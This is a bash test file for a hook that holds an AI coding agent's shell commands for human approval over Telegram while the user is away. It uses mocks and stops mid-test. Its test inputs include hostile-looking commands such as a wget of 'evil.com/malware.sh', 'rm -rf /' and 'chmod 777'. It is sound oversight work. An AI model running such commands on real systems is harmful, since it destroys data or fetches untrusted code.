#!/usr/bin/env bash
# Tests for global/hooks/afd-relay.sh — PreToolUse hook for AFK permission approval
source "$(dirname "$0")/test-helpers.sh"

HOOK_SCRIPT="$REPO_ROOT/global/hooks/afd-relay.sh"

suite_header "afd-relay.sh (PreToolUse AFK relay)"

# ── Helpers ──────────────────────────────────────────────────────────────────

# Build JSON input matching what Claude Code sends to PreToolUse hooks.
# Uses python3 for reliable JSON encoding (handles quotes, special chars).
make_json() {
    local tool_name="${1:-Bash}"
    local command="${2:-}"
    local description="${3:-}"
    python3 << PYEOF
import json
d = {"tool_name": "$tool_name", "tool_input": {}}
cmd = """$command"""
desc = """$description"""
if cmd:
    d["tool_input"]["command"] = cmd
if desc:
    d["tool_input"]["description"] = desc
print(json.dumps(d))
PYEOF
}

# Run the hook with controlled HOME (and therefore controlled marker/afd paths).
# The hook uses $HOME to derive AFK_MARKER, USER_ACTIVE_MARKER, and AFD_CLI.
# By overriding HOME to MOCK_HOME, all paths resolve under our temp directory.
#
# Set HOOK_AFK_TIMEOUT before calling to override (default: 5s for fast tests).
# Set HOOK_AFK_TIMEOUT="USE_DEFAULT" to NOT pass AFD_AFK_TIMEOUT at all,
# letting the hook use its own default (3600).
# Returns exit code; captures stdout in $HOOK_STDOUT, stderr in $HOOK_STDERR.
run_hook_with() {
    local json_input="$1"
    shift

    local rc=0
    HOOK_STDOUT=""
    HOOK_STDERR=""

    local out_file="$TEST_TMPDIR/stdout.txt"
    local err_file="$TEST_TMPDIR/stderr.txt"

    local timeout_val="${HOOK_AFK_TIMEOUT:-5}"

    if [[ "$timeout_val" == "USE_DEFAULT" ]]; then
        # Don't set AFD_AFK_TIMEOUT — let the hook use its own ${AFD_AFK_TIMEOUT:-3600}
        env -u AFD_AFK_TIMEOUT \
            HOME="$MOCK_HOME" \
            "$@" \
            bash "$HOOK_SCRIPT" \
            < <(printf '%s' "$json_input") \
            > "$out_file" 2> "$err_file" || rc=$?
    else
        HOME="$MOCK_HOME" \
            AFD_AFK_TIMEOUT="$timeout_val" \
            "$@" \
            bash "$HOOK_SCRIPT" \
            < <(printf '%s' "$json_input") \
            > "$out_file" 2> "$err_file" || rc=$?
    fi

    HOOK_STDOUT="$(cat "$out_file")"
    HOOK_STDERR="$(cat "$err_file")"
    return "$rc"
}

# Set up a fresh MOCK_HOME with no markers (not AFK).
# Places the mock afd CLI at $MOCK_HOME/.local/bin/afd — exactly where
# the hook expects it (AFD_CLI="${HOME}/.local/bin/afd").
setup_mock_home() {
    MOCK_HOME="$TEST_TMPDIR/home"
    mkdir -p "$MOCK_HOME/.local/bin"
    MOCK_AFD="$MOCK_HOME/.local/bin/afd"
    export MOCK_AFD_LOG="$TEST_TMPDIR/afd-calls.log"

    # Default mock afd: logs calls, returns success for notify, approved for poll
    cat > "$MOCK_AFD" << 'EOF'
#!/usr/bin/env bash
echo "$@" >> "$MOCK_AFD_LOG"
if [[ "$1" == "notify" ]]; then
    echo "Notification #42 sent to all"
elif [[ "$1" == "poll" ]]; then
    echo "approved"
fi
exit 0
EOF
    chmod +x "$MOCK_AFD"
}

# Create AFK marker
set_afk() {
    touch "$MOCK_HOME/.afd-afk"
}

# Create user-active marker (newer than AFK)
set_user_active() {
    # Ensure user-active is newer than afk marker
    sleep 0.05
    touch "$MOCK_HOME/.afd-user-active"
}

# Replace the mock afd with a custom script
set_mock_afd() {
    cat > "$MOCK_AFD"
    chmod +x "$MOCK_AFD"
}

# ── Non-Bash tools always allowed ───────────────────────────────────────────

test_non_bash_tool_allowed_no_afk() {
    setup_mock_home
    local json
    json=$(make_json "Read")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "Read tool should be allowed when not AFK"
}
run_test "non-Bash tool (Read) allowed when not AFK" test_non_bash_tool_allowed_no_afk

test_non_bash_tool_allowed_during_afk() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Write")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "Write tool should be allowed even during AFK"
}
run_test "non-Bash tool (Write) allowed during AFK" test_non_bash_tool_allowed_during_afk

test_edit_tool_allowed_during_afk() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Edit")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "Edit tool should be allowed during AFK"
}
run_test "non-Bash tool (Edit) allowed during AFK" test_edit_tool_allowed_during_afk

test_glob_tool_allowed_during_afk() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Glob")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "Glob tool should be allowed during AFK"
}
run_test "non-Bash tool (Glob) allowed during AFK" test_glob_tool_allowed_during_afk

test_mcp_tool_allowed_during_afk() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "mcp__github__get_issue")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "MCP tool should be allowed during AFK"
}
run_test "MCP tool allowed during AFK" test_mcp_tool_allowed_during_afk

test_task_tool_allowed_during_afk() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Task")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "Task tool should be allowed during AFK"
}
run_test "non-Bash tool (Task) allowed during AFK" test_task_tool_allowed_during_afk

# ── AFK mode detection (marker file presence/absence) ───────────────────────

test_no_afk_marker_allows_all() {
    setup_mock_home
    # No AFK marker — rm should be allowed
    local json
    json=$(make_json "Bash" "rm -rf /tmp/something")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "dangerous command should be allowed when not AFK"
}
run_test "no AFK marker: dangerous command allowed" test_no_afk_marker_allows_all

test_afk_marker_triggers_approval() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "rm -rf /tmp/something" "Delete temp files")
    local rc=0
    run_hook_with "$json" || rc=$?
    # With default mock (approved), should exit 0
    assert_eq "0" "$rc" "dangerous command during AFK should go through approval flow"
    # Verify afd was called
    assert_file_exists "$MOCK_AFD_LOG" "afd should have been called"
    assert_file_contains "$MOCK_AFD_LOG" "notify" "afd notify should have been called"
    assert_file_contains "$MOCK_AFD_LOG" "poll" "afd poll should have been called"
}
run_test "AFK marker present: dangerous command triggers approval" test_afk_marker_triggers_approval

# ── Secondary AFK deactivation ──────────────────────────────────────────────

test_user_active_deactivates_afk() {
    setup_mock_home
    set_afk
    set_user_active
    # Both markers exist, user-active is newer → AFK should deactivate
    local json
    json=$(make_json "Bash" "rm -rf /tmp/something")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "command should be allowed after AFK deactivation"
    # Both markers should be removed
    assert_file_not_exists "$MOCK_HOME/.afd-afk" "AFK marker should be removed"
    assert_file_not_exists "$MOCK_HOME/.afd-user-active" "user-active marker should be removed"
}
run_test "user-active marker deactivates AFK (secondary deactivation)" test_user_active_deactivates_afk

test_user_active_older_than_afk_stays_afk() {
    setup_mock_home
    # Create user-active FIRST (older)
    touch "$MOCK_HOME/.afd-user-active"
    sleep 0.05
    # Then create AFK marker (newer)
    touch "$MOCK_HOME/.afd-afk"
    # user-active is older than afk → AFK stays active
    local json
    json=$(make_json "Bash" "rm -rf /tmp/something")
    local rc=0
    run_hook_with "$json" || rc=$?
    # Should go through approval (mock approves → exit 0)
    assert_eq "0" "$rc"
    # AFK marker should still exist
    assert_file_exists "$MOCK_HOME/.afd-afk" "AFK marker should remain (user-active is older)"
    # afd should have been called for approval
    assert_file_exists "$MOCK_AFD_LOG" "afd should have been called"
}
run_test "user-active older than AFK marker: stays AFK" test_user_active_older_than_afk_stays_afk

test_user_active_without_afk_noop() {
    setup_mock_home
    # Only user-active marker, no AFK → nothing to deactivate
    touch "$MOCK_HOME/.afd-user-active"
    local json
    json=$(make_json "Bash" "rm -rf /tmp/something")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "should allow command when not AFK"
    # user-active marker should remain (only removed during deactivation)
    assert_file_exists "$MOCK_HOME/.afd-user-active" "user-active should remain when no AFK"
}
run_test "user-active without AFK marker: no-op deactivation" test_user_active_without_afk_noop

test_afk_deactivation_then_no_approval() {
    setup_mock_home
    set_afk
    set_user_active
    # After deactivation, no approval should happen even for dangerous commands
    local json
    json=$(make_json "Bash" "rm -rf /tmp/something")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc"
    # afd should NOT be called — deactivation short-circuits
    assert_file_not_exists "$MOCK_AFD_LOG" "no afd call after deactivation"
}
run_test "AFK deactivation skips approval entirely" test_afk_deactivation_then_no_approval

# ── Safe command allowlisting ────────────────────────────────────────────────

# Test each safe pattern individually
test_safe_ls() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "ls -la /tmp")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "ls should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG" "afd should not be called for safe command"
}
run_test "safe command: ls allowed during AFK" test_safe_ls

test_safe_cat() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "cat /etc/hostname")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "cat should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: cat allowed during AFK" test_safe_cat

test_safe_git() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "git status")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "git should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: git allowed during AFK" test_safe_git

test_safe_echo() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "echo hello world")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "echo should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: echo allowed during AFK" test_safe_echo

test_safe_grep() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "grep -r pattern /tmp")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "grep should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: grep allowed during AFK" test_safe_grep

test_safe_find() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "find /tmp -name foo")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "find should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: find allowed during AFK" test_safe_find

test_safe_head() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "head -20 /tmp/file.txt")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "head should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: head allowed during AFK" test_safe_head

test_safe_tail() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "tail -f /var/log/syslog")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "tail should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: tail allowed during AFK" test_safe_tail

test_safe_which() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "which python3")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "which should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: which allowed during AFK" test_safe_which

test_safe_date() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "date +%Y-%m-%d")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "date should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: date allowed during AFK" test_safe_date

test_safe_pwd() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "pwd")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "pwd should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: pwd allowed during AFK" test_safe_pwd

test_safe_wc() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "wc -l /tmp/file.txt")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "wc should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: wc allowed during AFK" test_safe_wc

test_safe_stat() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "stat /tmp/file.txt")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "stat should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: stat allowed during AFK" test_safe_stat

test_safe_du() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "du -sh /tmp")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "du should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: du allowed during AFK" test_safe_du

test_safe_readlink() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "readlink -f /tmp/link")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "readlink should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: readlink allowed during AFK" test_safe_readlink

test_safe_basename() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "basename /tmp/path/file.txt")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "basename should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: basename allowed during AFK" test_safe_basename

test_safe_dirname() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "dirname /tmp/path/file.txt")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "dirname should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: dirname allowed during AFK" test_safe_dirname

test_safe_realpath() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "realpath /tmp/link")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "realpath should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: realpath allowed during AFK" test_safe_realpath

test_safe_test_cmd() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "test -f /tmp/file.txt")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "test should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: test allowed during AFK" test_safe_test_cmd

test_safe_printf() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "printf hello")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "printf should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: printf allowed during AFK" test_safe_printf

test_safe_afd() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "afd status")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "afd should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: afd allowed during AFK" test_safe_afd

test_safe_node() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "node --version")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "node should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: node allowed during AFK" test_safe_node

test_safe_diff() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "diff file1.txt file2.txt")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "diff should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: diff allowed during AFK" test_safe_diff

test_safe_sort() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "sort /tmp/data.txt")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "sort should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: sort allowed during AFK" test_safe_sort

test_safe_ssh() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "ssh vps uptime")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "ssh should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: ssh allowed during AFK" test_safe_ssh

test_safe_jq() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "jq .key /tmp/data.json")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "jq should be safe"
    assert_file_not_exists "$MOCK_AFD_LOG"
}
run_test "safe command: jq allowed during AFK" test_safe_jq

# ── Dangerous command blocking (AFK, not in safe list) ──────────────────────

test_dangerous_rm() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "rm -rf /tmp/something")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_file_exists "$MOCK_AFD_LOG" "afd should be called for rm"
    assert_file_contains "$MOCK_AFD_LOG" "notify" "should send notification"
}
run_test "dangerous command: rm triggers approval" test_dangerous_rm

test_dangerous_kill() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "kill -9 12345")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_file_exists "$MOCK_AFD_LOG" "afd should be called for kill"
}
run_test "dangerous command: kill triggers approval" test_dangerous_kill

test_dangerous_npm_install() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "npm install some-package")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_file_exists "$MOCK_AFD_LOG" "afd should be called for npm install"
}
run_test "dangerous command: npm install triggers approval" test_dangerous_npm_install

test_dangerous_pip() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "pip install requests")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_file_exists "$MOCK_AFD_LOG" "afd should be called for pip"
}
run_test "dangerous command: pip install triggers approval" test_dangerous_pip

test_dangerous_curl() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "curl https://example.com/script.sh")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_file_exists "$MOCK_AFD_LOG" "afd should be called for curl"
}
run_test "dangerous command: curl triggers approval" test_dangerous_curl

test_dangerous_chmod() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "chmod 777 /tmp/secret")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_file_exists "$MOCK_AFD_LOG" "afd should be called for chmod"
}
run_test "dangerous command: chmod triggers approval" test_dangerous_chmod

test_dangerous_mv() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "mv /important/file /dev/null")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_file_exists "$MOCK_AFD_LOG" "afd should be called for mv"
}
run_test "dangerous command: mv triggers approval" test_dangerous_mv

test_dangerous_sudo() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "sudo systemctl restart sshd")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_file_exists "$MOCK_AFD_LOG" "afd should be called for sudo"
}
run_test "dangerous command: sudo triggers approval" test_dangerous_sudo

test_dangerous_python3() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "python3 script.py")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_file_exists "$MOCK_AFD_LOG" "python3 should trigger approval"
}
run_test "dangerous command: python3 triggers approval" test_dangerous_python3

test_dangerous_bash_c() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "bash -c whoami")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_file_exists "$MOCK_AFD_LOG" "bash -c should trigger approval"
}
run_test "dangerous command: bash -c triggers approval" test_dangerous_bash_c

test_dangerous_wget() {
    setup_mock_home
    set_afk
    local json
    json=$(make_json "Bash" "wget https://evil.com/malware.sh")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_file_exists "$MOCK_AFD_LOG" "wget should trigger approval"
}
run_test "dangerous command: wget triggers approval" test_dangerous_wget

# ── Approval flow (afd poll returns "approved" → exit 0) ────────────────────

test_approval_flow_approved() {
    setup_mock_home
    set_afk
    # Default mock already returns "approved" for poll
    local json
    json=$(make_json "Bash" "rm -rf /tmp/something" "Delete temp files")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc" "approved command should exit 0"
    assert_contains "$HOOK_STDERR" "Approved" "stderr should mention approval"
}
run_test "approval flow: approved exits 0" test_approval_flow_approved

# ── Denial flow (afd poll returns "denied" → exit 2) ────────────────────────

test_approval_flow_denied() {
    setup_mock_home
    set_afk
    # Mock afd: notify succeeds, poll returns "denied"
    set_mock_afd << 'EOF'
#!/usr/bin/env bash
if [[ "$1" == "notify" ]]; then
    echo "Notification #42 sent to all"
elif [[ "$1" == "poll" ]]; then
    echo "denied"
    exit 0
fi
EOF

    local json
    json=$(make_json "Bash" "rm -rf /tmp/something")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "2" "$rc" "denied command should exit 2"
    assert_contains "$HOOK_STDERR" "denied" "stderr should mention denial"
}
run_test "denial flow: denied exits 2" test_approval_flow_denied

# ── Timeout flow (afd poll times out → exit 2) ──────────────────────────────

test_approval_flow_timeout() {
    setup_mock_home
    set_afk
    # Mock afd: notify succeeds, poll returns timeout (non-zero exit, non-approved output)
    set_mock_afd << 'EOF'
#!/usr/bin/env bash
if [[ "$1" == "notify" ]]; then
    echo "Notification #42 sent to all"
elif [[ "$1" == "poll" ]]; then
    echo "timeout"
    exit 1
fi
EOF

    local json
    json=$(make_json "Bash" "rm -rf /tmp/something")
    local rc=0
    HOOK_AFK_TIMEOUT=1 run_hook_with "$json" || rc=$?
    assert_eq "2" "$rc" "timed out command should exit 2"
    assert_contains "$HOOK_STDERR" "timeout" "stderr should mention timeout"
}
run_test "timeout flow: poll timeout exits 2" test_approval_flow_timeout

# ── Notification failure (afd CLI fails → exit 2) ───────────────────────────

test_notification_failure_no_id() {
    setup_mock_home
    set_afk
    # Mock afd: notify returns something without a notification ID
    set_mock_afd << 'EOF'
#!/usr/bin/env bash
if [[ "$1" == "notify" ]]; then
    echo "Error: connection failed"
    exit 1
fi
EOF

    local json
    json=$(make_json "Bash" "rm -rf /tmp/something")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "2" "$rc" "should block when notification fails"
    assert_contains "$HOOK_STDERR" "Failed to send" "stderr should indicate notification failure"
}
run_test "notification failure: no ID extracted exits 2" test_notification_failure_no_id

test_notification_failure_empty_output() {
    setup_mock_home
    set_afk
    # Mock afd: notify returns empty
    set_mock_afd << 'EOF'
#!/usr/bin/env bash
if [[ "$1" == "notify" ]]; then
    echo ""
    exit 0
fi
EOF

    local json
    json=$(make_json "Bash" "rm -rf /tmp/something")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "2" "$rc" "should block when notification returns empty"
}
run_test "notification failure: empty output exits 2" test_notification_failure_empty_output

test_notification_failure_afd_missing() {
    setup_mock_home
    set_afk
    # Remove the mock afd entirely
    rm -f "$MOCK_AFD"

    local json
    json=$(make_json "Bash" "rm -rf /tmp/something")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "2" "$rc" "should block when afd CLI is missing"
    assert_contains "$HOOK_STDERR" "afd CLI not found" "stderr should indicate afd is missing"
}
run_test "notification failure: afd binary missing exits 2" test_notification_failure_afd_missing

# ── Approval code generation ────────────────────────────────────────────────

test_approval_code_in_notification() {
    setup_mock_home
    set_afk
    # Mock afd that captures ALL args (including multiline) with NUL separator
    set_mock_afd << 'MOCK_EOF'
#!/usr/bin/env bash
for arg in "$@"; do printf '%s|' "$arg"; done >> "$MOCK_AFD_LOG"
printf '\n' >> "$MOCK_AFD_LOG"
if [[ "$1" == "notify" ]]; then
    echo "Notification #99 sent to all"
elif [[ "$1" == "poll" ]]; then
    echo "approved"
fi
exit 0
MOCK_EOF

    local json
    json=$(make_json "Bash" "rm -rf /tmp/something" "Delete temp files")
    local rc=0
    run_hook_with "$json" || rc=$?
    assert_eq "0" "$rc"

    # Read the full log (multiline args are NUL-separated)
    local log_content
    log_content=$(cat "$MOCK_AFD_LOG")
    assert_contains "$log_content" "Permission needed" "notification should contain permission request"
    assert_contains "$log_content" "--ref" "notification should contain --ref for approval code"
}
run_test "approval code included in notification message" test_approval_code_in_notification

# ── Notification message contents ────────────────────────────────────────────

test_notification_includes_description() {
    setup_mock_home
    set_afk
    set_mock_afd << 'MOCK_EOF'
#!/usr/bin/env bash
for arg in "$@"; do printf '%s|' "$arg"; done >> "$MOCK_AFD_LOG"
printf '\n' >> "$MOCK_AFD_LOG"
if [[ "$1" == "notify" ]]; then
    echo "Notification #42 sent to all"
elif [[ "$1" == "poll" ]]; then
    echo "approved"
fi
exit 0
MOCK_EOF

    local json
    json=$(make_json "Bash" "rm -rf /tmp/something" "Delete temporary build artifacts")
    local rc=0
    run_hook_with "$json" || rc=$?

    local log_content
    log_content=$(cat "$MOCK_AFD_LOG")
    assert_contains "$log_content" "Delete temporary build artifacts" "notification should contain description"
}
run_test "notification message includes tool description" test_notification_includes_description

test_notification_includes_command() {
    setup_mock_home
    set_afk
    set_mock_afd << 'MOCK_EOF'
#!/usr/bin/env bash
for arg in "$@"; do printf '%s|' "$arg"; done >> "$MOCK_AFD_LOG"
printf '\n' >> "$MOCK_AFD_LOG"
if [[ "$1" == "notify" ]]; then
    echo "Notification #42 sent to all"
elif [[ "$1" == "poll" ]]; then
    echo "approved"
fi
exit 0
MOCK_EOF

    local json
    json=$(make_json "Bash" "rm -rf /tmp/something")
    local rc=0
    run_hook_with "$json" || rc=$?

    local log_content
    log_content=$(cat "$MOCK_AFD_LOG")
    assert_contains "$log_content" "rm -rf /tmp/something" "notification should contain the command"
}
run_test "notification message includes the command" test_notification_includes_command

# ── Poll passes notification ID ─────────────────────────────────────────────

test_poll_uses_notification_id() {
    setup_mock_home
    set_afk
    set_mock_afd << 'MOCK_EOF'
#!/usr/bin/env bash
echo "$@" >> "$MOCK_AFD_LOG"
if [[ "$1" == "notify" ]]; then
    echo "Notification #77 sent to all"
elif [[ "$1" == "poll" ]]; then
    echo "approved"
fi
exit 0
MOCK_EOF

    local json
    json=$(make_json "Bash" "rm -rf /tmp/something")
    local rc=0
    run_hook_with "$json" || rc=$?

    local poll_call
    poll_call=$(grep "poll" "$MOCK_AFD_LOG" | head -1)
    assert_contains "$poll_call" "77" "poll should use the notification ID from notify response"
}
run_test "poll passes correct notification ID" test_poll_uses_notification_id

# ── Poll uses AFD_AFK_TIMEOUT ───────────────────────────────────────────────

test_poll_uses_custom_timeout() {
    setup_mock_home
    set_afk
    set_mock_afd << 'MOCK_EOF'
#!/usr/bin/env bash
echo "$@" >> "$MOCK_AFD_LOG"
if [[ "$1" == "notify" ]]; then
    echo "Notification #42 sent to all"
elif [[ "$1" == "poll" ]]; then
    echo "approved"
fi
exit 0
MOCK_EOF

    local json
    json=$(make_json "Bash" "rm -rf /tmp/something")
    local rc=0
    HOOK_AFK_TIMEOUT=120 run_hook_with "$json" || rc=$?

    local poll_call
    poll_call=$(grep "poll" "$MOCK_AFD_LOG" | head -1)
    assert_contains "$poll_call" "120" "poll should use custom timeout value"
}
run_test "poll uses AFD_AFK_TIMEOUT env var" test_poll_uses_custom_timeout

test_poll_default_timeout() {
    setup_mock_home
    set_afk
    set_mock_afd << 'MOCK_EOF'
#!/usr/bin/env bash
echo "$@" >> "$MOCK_AFD_LOG"
if [[ "$1" == "notify" ]]; then
    echo "Notification #42 sent to all"
elif [[ "$1" == "poll" ]]; then
    echo "approved"
fi
exit 0
MOCK_EOF

    local json
    json=$(make_json "Bash" "rm -rf /tmp/something")
    local rc=0
    # USE_DEFAULT tells run_hook_with to NOT set AFD_AFK_TIMEOUT,
    # so the hook falls through to its own ${AFD_AFK_TIMEOUT:-3600}
    HOOK_AFK_TIMEOUT="USE_DEFAULT" run_hook_with "$json" || rc=$?

    local poll_call
    poll_call=$(grep "poll" "$MOCK_AFD_LOG" | head -1)
    assert_contains "$poll_call" "3600" "poll should use default 3600 timeout"
}
run_test "poll uses default 3600 timeout when env var unset" test_poll_default_timeout

# ── Notify arguments structure ──────────────────────────────────────────────

test_notify_uses_telegram_channel() {
    setup_mock_home
    set_afk
    set_mock_afd << 'MOCK_EOF'
#!/usr/bin/env bash
for arg in "$@"; do printf '%s|' "$arg"; done >> "$MOCK_AFD_LOG"
printf '\n' >> "$MOCK_AFD_LOG"
if [[ "$1" == "notify" ]]; then
    echo "Notification #42 sent to all"
elif [[ "$1" == "poll" ]]; then
    echo "approved"
fi
exit 0
MOCK_EOF

    local json
    json=$(make_json "Bash" "rm /tmp/foo")
    local rc=0
    run_hook_with "$json" || rc=$?

    local log_content
    log_content=$(cat "$MOCK_AFD_LOG")
    assert_contains "$log_content" "--channel" "should use --channel flag"
    assert_contains "$log_content" "telegram" "should specify telegram channel"
    assert_contains "$log_content" "--type" "should use --type flag"
    assert_contains "$log_content" "permission" "should specify permission type"
    assert_contains "$log_content" "--priority" "should use --priority flag"
    assert_contains "$log_content" "high" "should specify high priority"
}
run_test "notify uses correct flags (telegram, permission, high)" test_notify_uses_telegram_channel

# ── JSON input parsing ──────────────────────────────────────────────────────

test_json_missing_tool_name() {
    setup_mock_home
    set_afk
    # JSON with no tool_name → should default to empty string, not Bash → exit 0
    local rc=0
    run_hook_with '{"tool_input": {"command": "rm -rf /"}}' || rc=$?
    assert_eq "0" "$rc" "missing tool_name should not be treated as Bash"
}
run_test "JSON parsing: missing tool_name treated as non-Bash" test_json_missing_tool_name

test_json_empty_command() {
    setup_mock_home
    set_afk
    # Bash with empty command → goes through safe check, empty matches nothing → triggers approval
    local rc=0
